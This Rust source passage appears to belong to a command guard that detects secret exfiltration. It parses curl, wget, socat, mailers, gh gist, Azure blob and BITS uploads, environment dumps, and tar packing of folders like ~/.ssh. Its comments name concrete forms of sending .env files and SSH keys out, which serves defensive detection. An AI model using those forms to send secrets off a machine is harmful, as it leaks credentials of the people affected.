/// (`node -p 'process.env'`), and the value of each `name=value`; for `tar`
/// and `zip` packing an archive, its members.
fn candidates(unit: &Unit, key: &str) -> Vec<Arg> {
    // What an archive packs is its members, not its options' patterns.
    if let Some(archive) = archive(unit, key) {
        return archive.members;
    }
    let logs_in = KEY_USERS.contains(&key);
    let interprets = INTERPRETERS.contains(&key) || key.starts_with("python");
    let mut found = Vec::new();
    let mut iter = unit.args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if interprets && takes_code(key, text) {
            iter.next();
            continue;
        }
        if logs_in {
            if LOGIN_OPTIONS.contains(&text) {
                iter.next();
                continue;
            }
            if text
                .split_once('=')
                .is_some_and(|(option, _)| LOGIN_OPTIONS.contains(&option))
            {
                continue;
            }
        }
        found.push(arg.clone());
        if let Some((_, value)) = text.split_once('=').filter(|(_, value)| !value.is_empty()) {
            found.push(Arg::Known(value.to_string()));
        }
    }
    if key == "tar" {
        found.extend(tar_members(&unit.args));
    }
    found
}

/// Whether the interpreter `key`'s option or command takes the code it runs
/// as the next word: an option that carries code (see
/// [`crate::launch::code_options`]) alone or ending a bundle of short options
/// (`perl -lne`), but not after one that takes a value of its own (`php -d
/// e`, `python3 -Wignore`); php's `-F` names a file it runs, which it reads.
/// `deno eval` and `bun -p` too.
fn takes_code(key: &str, text: &str) -> bool {
    if (key == "deno" && text == "eval") || (key == "bun" && text == "-p") {
        return true;
    }
    let (short, long) = code_options(key);
    if long.contains(&text) {
        return true;
    }
    let Some(bundle) = text
        .strip_prefix('-')
        .filter(|bundle| !bundle.is_empty() && !bundle.starts_with('-'))
    else {
        return false;
    };
    let valued = valued_options(key);
    for (at, letter) in bundle.char_indices() {
        if short.contains(&letter) && !(key == "php" && letter == 'F') {
            return at + letter.len_utf8() == bundle.len();
        }
        if valued.contains(&letter) {
            return false;
        }
    }
    false
}

/// What `tar` packs from a folder `-C` (`--directory`) moved it to, joined
/// to that folder: `tar czf - -C ~ .ssh` packs `~/.ssh`.
fn tar_members(args: &[Arg]) -> Vec<Arg> {
    let mut found = Vec::new();
    let mut folder: Option<String> = None;
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if matches!(text, "-C" | "--directory") {
            folder = iter.next().and_then(Arg::known).map(str::to_string);
        } else if let Some(value) = text.strip_prefix("--directory=") {
            folder = Some(value.to_string());
        } else if text.starts_with('-') {
            continue;
        } else if let Some(folder) = &folder {
            if text.starts_with('/') {
                continue;
            }
            let folder = folder.trim_end_matches('/');
            found.push(Arg::Known(format!("{folder}/{text}")));
        }
    }
    found
}

/// Whether `unit` prints the whole environment: `env`, `printenv`, `set`,
/// `export -p`, `declare -x`, PowerShell's `Get-ChildItem env:`.
fn dumps_environment(unit: &Unit, key: &str) -> bool {
    let args = unit.args.as_slice();
    let none = operands(args, &[]).is_empty();
    match (unit.shell, key) {
        (Shell::Posix, "env") => true,
        (Shell::Posix, "printenv") => none,
        (Shell::Posix, "set") => args.is_empty(),
        (Shell::Posix, "export") => none,
        (Shell::Posix, "declare" | "typeset") => {
            none && (has_flag(args, Some('p'), None) || has_flag(args, Some('x'), None))
        }
        // `env:`, `env:\`, `env:*`, and a wildcard that may match many
        // (`env:AWS*`), listed or printed (`Get-Content env:*`).
        (
            Shell::PowerShell,
            "get-childitem" | "get-item" | "get-content" | "gc" | "cat" | "type",
        ) => args.iter().any(|arg| {
            arg.known().is_some_and(|text| {
                text.to_ascii_lowercase()
                    .strip_prefix("env:")
                    .is_some_and(|rest| {
                        let rest = rest.trim_matches(['\\', '/']);
                        rest.is_empty() || glob::has_wildcard(rest)
                    })
            })
        }),
        _ => false,
    }
}

/// `/proc/self/environ` and the like: the environment, as a file.
fn is_environ(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.starts_with("/proc/") && lower.ends_with("/environ")
}

/// A public key is meant to be shared.
fn public_key(text: &str) -> bool {
    text.to_ascii_lowercase().ends_with(".pub")
}

/// The secret a file's name says it holds: an `.env` file (`.env`,
/// `.env.local`, `config/.env.production`, `prod.env`), an `.envrc`, or a
/// shell's or a prompt's history; when the shell expands it (`glob`), a
/// pattern that can name an `.env` or `.envrc` file. Not a folder, a
/// template (`.env.example`, `example.env`) or an encrypted copy
/// (`.env.gpg`, `.env.vault`), which are made to be committed or sent.
fn secret_name(text: &str, shell: Shell, hidden: bool, glob: bool) -> Option<&'static str> {
    let windows = shell != Shell::Posix;
    let separators: &[char] = if windows { &['/', '\\'] } else { &['/'] };
    if text.ends_with(separators) {
        return None;
    }
    let name = text.rsplit(separators).next().unwrap_or(text);
    // Windows reads `.env.`, `.env ` and `.env:stream` as `.env`.
    let name = if windows {
        name.split(':')
            .next()
            .unwrap_or(name)
            .trim_end_matches(['.', ' '])
    } else {
        name
    };
    if glob::has_wildcard(name) {
        // A wildcard in a name the shell does not expand is a letter.
        if !glob {
            return None;
        }
        let flavour = if windows {
            Flavour::Windows
        } else {
            Flavour::Posix
        };
        let matches = |file: &str| glob::matches(name, file, flavour, hidden);
        return if matches(".env") || matches(".env.local") {
            Some(DOTENV)
        } else if matches(".envrc") {
            Some(ENVRC)
        } else {
            None
        };
    }
    let lower = name.to_ascii_lowercase();
    if lower == ".envrc" {
        return Some(ENVRC);
    }
    if HISTORIES.contains(&lower.as_str()) {
        return Some(HISTORY);
    }
    let encrypted = lower
        .rsplit_once('.')
        .is_some_and(|(_, extension)| ENCRYPTED.contains(&extension));
    let dotenv = match lower.strip_prefix(".env") {
        Some("") => true,
        Some(rest) => rest
            .strip_prefix('.')
            .is_some_and(|suffix| !TEMPLATES.contains(&suffix) && !encrypted),
        None => lower
            .strip_suffix(".env")
            .is_some_and(|stem| !stem.is_empty() && !TEMPLATES.contains(&stem)),
    };
    dotenv.then_some(DOTENV)
}

/// A file a unit uploads: `-` stands for its input.
struct Upload {
    arg: Arg,
    /// Whether it is a word of its own, which the shell expands when it is a
    /// pattern (`-T .env*`), and not a part of one (`-d @.env*`, where the
    /// pattern is the whole word and the program reads the name as written).
    word: bool,
}

/// The files a unit uploads, named in its own arguments.
fn uploads(unit: &Unit, key: &str) -> Vec<Upload> {
    match key {
        "curl" => curl_files(&unit.args),
        "wget" => wget_files(&unit.args),
        "http" | "https" | "xh" => unit
            .args
            .iter()
            .filter_map(Arg::known)
            .filter(|text| !text.starts_with('-'))
            .filter_map(item_file)
            .map(|file| named(file, false))
            .collect(),
        "invoke-webrequest" | "invoke-restmethod" => parameter(&unit.args, "infile")
            .into_iter()
            .map(|arg| Upload { arg, word: true })
            .collect(),
        "start-bitstransfer" => bits_files(&unit.args),
        // `-Attachments` takes a list of files and mails them.
        "send-mailmessage" => parameter_list(&unit.args, "attachments")
            .into_iter()
            .map(|arg| Upload { arg, word: true })
            .collect(),
        "socat" => socat_files(&unit.args),
        key if MAILERS.contains(&key) => attachments(&unit.args),
        "gh" => gist_files(&unit.args).unwrap_or_default(),
        "az" => blob_files(&unit.args),
        _ => Vec::new(),
    }
}

/// The files `socat` reads to send: a `FILE:`, `OPEN:`, `GOPEN:` or
/// `READFILE:` address (its path up to the first `,`), when another of its
/// addresses reaches another machine (`TCP:host:1`, `OPENSSL:…`).
fn socat_files(args: &[Arg]) -> Vec<Upload> {
    let addresses: Vec<&str> = args
        .iter()
        .filter_map(Arg::known)
        .filter(|text| !(text.len() > 1 && text.starts_with('-')))
        .collect();
    let kind = |address: &str| {
        address
            .split([':', ','])
            .next()
            .unwrap_or_default()
            .to_ascii_lowercase()
    };
    let network = addresses.iter().any(|address| {
        let kind = kind(address);
        SOCAT_NETWORK
            .iter()
            .any(|network| kind.starts_with(network))
    });
    if !network {
        return Vec::new();
    }
    addresses
        .iter()
        .filter(|address| SOCAT_FILES.contains(&kind(address).as_str()))
        .filter_map(|address| address.split_once(':'))
        .map(|(_, rest)| named(rest.split(',').next().unwrap_or(rest), false))
        .collect()
}

/// The files `mail`, `mailx`, `s-nail`, `mutt` and `neomutt` attach: the
/// values of `-a`, `-A` and `--attach`, given apart or joined, up to the
/// next option (`mutt -a f1 f2 -- to`).
fn attachments(args: &[Arg]) -> Vec<Upload> {
    let mut files = Vec::new();
    let mut taking = false;
    for arg in args {
        let Some(text) = arg.known() else {
            if taking {
                files.push(Upload {
                    arg: arg.clone(),
                    word: true,
                });
            }
            continue;
        };
        if text.starts_with('-') && text.len() > 1 {
            taking = false;
            if text == "--attach" {
                taking = true;
            } else if let Some(file) = text.strip_prefix("--attach=") {
                files.push(named(file, false));
            } else if text.starts_with("--") {
            } else if let Some(rest) = text.strip_prefix("-a").or_else(|| text.strip_prefix("-A")) {
                if rest.is_empty() {
                    taking = true;
                } else {
                    files.push(named(rest, false));
                }
            }
        } else if taking {
            files.push(named(text, true));
        }
    }
    files
}

/// The files `gh gist create` (`gh gist new`) posts, `-` for its input;
/// `None` for any other `gh` command.
fn gist_files(args: &[Arg]) -> Option<Vec<Upload>> {
    let all = operands(args, &["-d", "--desc", "-f", "--filename"]);
    let verb = |at: usize, verbs: &[&str]| {
        all.get(at)
            .and_then(|arg| arg.known())
            .is_some_and(|word| verbs.contains(&word))
    };
    if !(verb(0, &["gist"]) && verb(1, &["create", "new"])) {
        return None;
    }
    Some(
        all.get(2..)
            .unwrap_or_default()
            .iter()
            .map(|arg| Upload {
                arg: (*arg).clone(),
                word: true,
            })
            .collect(),
    )
}

/// The file `az storage blob upload` sends: its `-f` (`--file`).
fn blob_files(args: &[Arg]) -> Vec<Upload> {
    let all = operands(args, &[]);
    let command: Vec<&str> = all.iter().take(3).filter_map(|arg| arg.known()).collect();
    if command != ["storage", "blob", "upload"] {
        return Vec::new();
    }
    let mut files = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        if matches!(text, "-f" | "--file") {
            files.extend(iter.next().map(|file| Upload {
                arg: file.clone(),
                word: true,
            }));
        } else if let Some(file) = text.strip_prefix("--file=") {
            files.push(named(file, false));
        }
    }
    files
}

/// What `Start-BitsTransfer` uploads: its `-Source` files, when `-TransferType`
/// is `Upload`. Without `-Source`, any word that is not a parameter or the
/// value of one may be a source given by position: a word after a switch
/// (`-Asynchronous`, `-Dynamic`), or after a parameter the guard does not
/// know, is one (see [`bits_takes_value`]).
fn bits_files(args: &[Arg]) -> Vec<Upload> {
    let upload = parameter(args, "transfertype").iter().any(|kind| {
        kind.known()
            .is_some_and(|kind| kind.to_ascii_lowercase().starts_with("upload"))
    });
    if !upload {
        return Vec::new();
    }
    let mut sources = parameter_list(args, "source");
    if sources.is_empty() {
        let positional = args.iter().enumerate().filter(|(at, arg)| {
            arg.known().is_none_or(|text| !text.starts_with('-'))
                && (*at == 0
                    || args
                        .get(*at - 1)
                        .and_then(Arg::known)
                        .is_none_or(|before| !bits_takes_value(before)))
        });
        sources.extend(positional.map(|(_, arg)| arg.clone()));
    }
    sources
        .into_iter()
        .map(|arg| Upload { arg, word: true })
        .collect()
}

/// The parameters of `Start-BitsTransfer` that take a value, its own and the
/// common ones, with the common ones' aliases.
const BITS_VALUES: [&str; 47] = [
    "source",
    "destination",
    "authentication",
    "credential",
    "description",
    "displayname",
    "priority",
    "proxyauthentication",
    "proxybypass",
    "proxycredential",
    "proxylist",
    "proxyusage",
    "retryinterval",
    "retrytimeout",
    "transferpolicy",
    "transfertype",
    "usestoredcredential",
    "certstorelocation",
    "certstorename",
    "certhash",
    "customheaders",
    "httpmethod",
    "maxdownloadtime",
    "securityflags",
    "notifyflags",
    "notifycmdline",
    "aclflags",
    "erroraction",
    "errorvariable",
    "warningaction",
    "warningvariable",
    "informationaction",
    "informationvariable",
    "outvariable",
    "outbuffer",
    "pipelinevariable",
    "progressaction",
    "ea",
    "ev",
    "wa",
    "wv",
    "infa",
    "iv",
    "ov",
    "ob",
    "pv",
    "proga",
];

/// The switches of `Start-BitsTransfer`, its own and the common ones, with
/// the common ones' aliases: they take no value.
const BITS_SWITCHES: [&str; 12] = [
    "asynchronous",
    "suspended",
    "dynamic",
    "customheaderswriteonly",
    "confirm",
    "whatif",
    "verbose",
    "debug",
    "cf",
    "wi",
    "vb",
    "db",
];

/// Whether `word` is a parameter of `Start-BitsTransfer` that takes the next
/// word as its value: one of [`BITS_VALUES`] by its name, or by an
/// abbreviation that no switch also begins with, or any parameter bound to
/// the next word by a colon (`-Asynchronous:$true`). A parameter the guard
/// does not know is not one, so the word after it is read as a source.
fn bits_takes_value(word: &str) -> bool {
    let Some(param) = word.strip_prefix('-') else {
        return false;
    };
    if param.ends_with(':') {
        return true;
    }
    let param = param.to_ascii_lowercase();
    if BITS_VALUES.contains(&param.as_str()) {
        return true;
    }
    !param.is_empty()
        && BITS_VALUES.iter().any(|value| value.starts_with(&param))
        && !BITS_SWITCHES
            .iter()
            .any(|switch| switch.starts_with(&param))
}

/// A file named in text; a device that is the input is `-`.
fn named(text: &str, word: bool) -> Upload {
    let stdin = matches!(text, "/dev/stdin" | "/dev/fd/0");
    Upload {
        arg: Arg::Known(if stdin { "-" } else { text }.to_string()),
        word,
    }
}

/// What `curl` takes from a file: `-d @f` (also `--data`, `--data-binary`,
/// `--data-ascii`, `--json`), `--data-urlencode name@f`, `-F name=@f` or
/// `name=<f`, `-T f` and `-H @f`.
fn curl_files(args: &[Arg]) -> Vec<Upload> {
    // curl expands `{a,b}` in an upload's name itself, unless told not to.
    let globs = !args
        .iter()
        .any(|arg| matches!(arg.known(), Some("-g" | "--globoff")));
    let mut files = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        // `attached` says the value is a part of the option's word.
        let mut take = |kind: char, value: Option<Arg>, attached: bool| {
            if let Some(Arg::Known(value)) = value {
                if kind == 'T' && globs {
                    for name in curl_glob(&value) {
                        files.extend(curl_file(kind, &name, !attached));
                    }
                } else {
                    files.extend(curl_file(kind, &value, !attached));
                }
            }
        };
        if let Some(long) = text.strip_prefix("--") {
            let (name, attached) = long
                .split_once('=')
                .map_or((long, None), |(name, value)| (name, Some(value)));
            let kind = match name {
                "data" | "data-binary" | "data-ascii" | "json" => 'd',
                "data-urlencode" => 'u',
                "form" => 'F',
                "upload-file" => 'T',
                "header" => 'H',
                _ => continue,
            };
            let value = match attached {
                Some(value) => Some(Arg::Known(value.to_string())),
                None => iter.next().cloned(),
            };
            take(kind, value, attached.is_some());
        } else if let Some(bundle) = text.strip_prefix('-') {
            for (at, letter) in bundle.char_indices() {
                let value = |rest: &str, iter: &mut std::slice::Iter<'_, Arg>| {
                    if rest.is_empty() {
                        iter.next().cloned()
                    } else {
                        Some(Arg::Known(rest.to_string()))
                    }
                };
                let rest = bundle.get(at + letter.len_utf8()..).unwrap_or_default();
                if matches!(letter, 'd' | 'F' | 'T' | 'H') {
                    take(letter, value(rest, &mut iter), !rest.is_empty());
                    break;
                }
                if CURL_VALUES.contains(letter) {
                    value(rest, &mut iter);
                    break;
                }
            }
        }
    }
    files
}

/// The files one `curl` option's value names, by the option's kind: `d`
/// data, `u` `--data-urlencode`, `F` a form field, `T` an upload, `H` a
/// header. Only `-T f` names its file as a word of its own (`word`).
fn curl_file(kind: char, value: &str, word: bool) -> Vec<Upload> {
    match kind {
        'd' | 'H' => value
            .strip_prefix('@')
            .map(|path| named(path, false))
            .into_iter()
            .collect(),
        'u' => value
            .split_once('@')
            .filter(|(name, _)| !name.contains('='))
            .map(|(_, path)| named(path, false))
            .into_iter()
            .collect(),
        'F' => value
            .split_once('=')
            .and_then(|(_, field)| field.strip_prefix('@').or_else(|| field.strip_prefix('<')))
            .map(|field| {
                field
                    .split(';')
                    .next()
                    .unwrap_or(field)
                    .split(',')
                    .map(|path| named(path, false))
                    .collect()
            })
            .unwrap_or_default(),
        // `-T .` uploads what is on the input.
        _ => vec![named(if value == "." { "-" } else { value }, word)],
    }
}

/// The names curl makes of an upload's name by its own `{a,b}` lists:
/// `{.env,README}` is `.env` and `README`. Past [`MAX_CURL_GLOB`] names, or
/// with a list left open, the name as written.
fn curl_glob(value: &str) -> Vec<String> {
    let mut names = vec![String::new()];
    let mut rest = value;
    while let Some(open) = rest.find('{') {
        let Some(close) = rest[open..].find('}').map(|close| open + close) else {
            break;
        };
        let before = &rest[..open];
        let mut next = Vec::new();
        for name in &names {
            for choice in rest[open + 1..close].split(',') {
                if next.len() >= MAX_CURL_GLOB {
                    return vec![value.to_string()];
                }
                next.push(format!("{name}{before}{choice}"));
            }
        }
        names = next;
        rest = &rest[close + 1..];
    }
    names.into_iter().map(|name| name + rest).collect()
}

/// What `wget` posts from a file: `--post-file f`, `--body-file f`.
fn wget_files(args: &[Arg]) -> Vec<Upload> {
    let mut files = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(text) = arg.known() else { continue };
        let Some(long) = text.strip_prefix("--") else {
            continue;
        };
        let (name, attached) = long
            .split_once('=')
            .map_or((long, None), |(name, value)| (name, Some(value)));
        if !matches!(name, "post-file" | "body-file") {
            continue;
        }
        let value = match attached {
            Some(value) => Some(value),
            None => iter.next().and_then(Arg::known),
        };
        files.extend(value.map(|file| named(file, attached.is_none())));
    }
    files
}

/// The file a request item names for `http` and `xh`: `field@f` uploads it,
/// `field=@f` and `field:=@f` read it as a value, `@f` is the body.
fn item_file(text: &str) -> Option<&str> {
    if text.contains("://") {
        return None;
    }
    let (name, path) = text.split_once('@')?;
    let field = name
        .strip_suffix(":=")
        .or_else(|| name.strip_suffix('='))
        .unwrap_or(name);
    (!field.contains(['=', ':', '@', '/'])).then_some(path)
}

/// The values of a PowerShell parameter, by its name or an abbreviation
/// of it.
fn parameter(args: &[Arg], name: &str) -> Vec<Arg> {
    let mut values = Vec::new();
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        let Some(param) = arg.known().and_then(|text| text.strip_prefix('-')) else {
            continue;
        };
        let param = param.trim_end_matches(':').to_ascii_lowercase();
        if param.len() >= 2 && name.starts_with(&param) {
            values.extend(iter.next().cloned());
        }
    }
    values
}

/// The values of a PowerShell parameter that takes a list (`-Attachments a,b`,
/// which the split reads as `-Attachments a b`): the words after it, up to the
/// next parameter.
fn parameter_list(args: &[Arg], name: &str) -> Vec<Arg> {
    let mut values = Vec::new();
    let mut taking = false;
    for arg in args {
        match arg.known().and_then(|text| text.strip_prefix('-')) {
            Some(param) => {
                let param = param.trim_end_matches(':').to_ascii_lowercase();
                taking = param.len() >= 2 && name.starts_with(&param);
            }
            None if taking => values.push(arg.clone()),
            None => {}
        }
    }
    values
}

/// Whether `unit` sends its input on: a program that does whatever it is
/// given, or one given an option that reads its body from the input.
fn takes_input(unit: &Unit, key: &str) -> bool {
    let args = unit.args.as_slice();
    let stdin = |files: Vec<Upload>| files.iter().any(|file| file.arg.known() == Some("-"));
    match key {
        "curl" => stdin(curl_files(args)),
        "wget" => stdin(wget_files(args)),
        // They read a body from their input unless told not to.
        "http" | "https" | "xh" => {
            !has_flag(args, Some('I'), Some("ignore-stdin"))
                && !has_flag(args, None, Some("offline"))
        }
        "openssl" => args.iter().any(|arg| arg.known() == Some("s_client")),
        // `gh gist create` with no file, or `-`, posts its input.
        "gh" => gist_files(args).is_some_and(|files| files.is_empty() || stdin(files)),
        "rclone" => operands(args, &[]).first().and_then(|arg| arg.known()) == Some("rcat"),
        "aws" | "gsutil" => {
            args.iter().any(|arg| arg.known() == Some("-"))
                && operands(args, &[])
                    .iter()
                    .any(|arg| to_other_machine(arg, false, unit.shell == Shell::Posix))
        }
        _ => SINKS.contains(&key),
    }
}
